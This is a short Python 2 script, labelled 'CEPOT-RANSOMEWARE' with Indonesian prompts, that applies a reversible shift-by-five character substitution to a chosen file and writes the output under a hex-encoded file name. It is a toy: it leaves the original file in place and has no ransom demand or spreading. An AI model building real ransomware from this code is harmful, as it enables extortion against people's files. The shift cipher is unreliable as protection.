import sys
import os

def encrypt(nama_file):
	try:
		file = open(nama_file, 'r')
		data = file.read()
		file2 = open(nama_file.encode('hex'), 'w')
		for i in data:
			encrypt = ord(i) - 5
			encryptfix = chr(encrypt)
			file2.write(encryptfix)
	except:
		print "file Tidak Ada"

def decrypt(nama_file):
	try:
		file = open(nama_file, 'r')
		data = file.read()
		file2 = open(nama_file.decode('hex'), 'w')
		for i in data:
			decrypt = ord(i) + 5
			decryptfix = chr(decrypt)
			file2.write(decryptfix)
	except:
		print "file Tidak ada"
print "===CEPOT-RANSOMEWARE===\n"
print "1. Encrypt Data\n2. Decrypt Data\n"
pilih = input("Masukan Pilihan Anda = ")
if pilih == 1:
	nama = raw_input('\nmasukan Nama File = ')
	encrypt(nama)
elif pilih == 2:
	nama = raw_input('\nMasukan Nama File = ')
	decrypt(nama)
else:
	print "exit"
